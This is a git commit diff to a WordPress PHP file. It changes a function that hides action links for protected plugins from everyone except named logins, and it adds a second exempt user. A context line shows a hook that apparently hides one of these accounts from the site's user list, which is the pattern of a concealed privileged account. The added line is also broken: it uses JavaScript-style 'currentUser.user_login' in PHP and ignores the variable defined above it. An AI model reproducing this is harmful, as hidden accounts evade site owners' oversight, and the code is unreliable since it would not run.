49a195107045f439c69a3a0eea9ef4dc2a7b7276
paveltravnicek <80485198+paveltravnicek@users.noreply.github.com>
2025-02-17 08:28:26 +0100

    Update universal-functions.php

--- universal-functions.php
+++ universal-functions.php
@@ -140,7 +140,7 @@ add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 function skryt_radek_akci_pro_chranene_pluginy() {
     $current_user = wp_get_current_user();
     
-    if ($current_user->user_login === 'paveltravnicek') {
+    if (currentUser.user_login === 'paveltravnicek' || currentUser.user_login === 'lukashulka') {
         return;
     }
 
